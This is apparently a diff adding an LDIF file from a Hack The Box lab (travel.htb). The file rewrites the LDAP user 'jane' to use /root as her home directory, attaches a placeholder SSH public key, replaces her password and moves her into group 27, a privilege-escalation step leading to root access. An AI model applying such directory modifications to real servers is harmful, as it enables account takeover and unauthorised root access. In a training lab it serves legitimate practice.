@@ -1,0 +1,16 @@
+dn: uid=jane,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changetype: modify
+replace: homeDirectory
+homeDirectory: /root
+-
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: ssh-rsa You-Id_Rsa-Here root@parrot
+-
+replace: userPassword
+userPassword: You_Password
+-
+replace: gidNumber
+gidNumber: 27
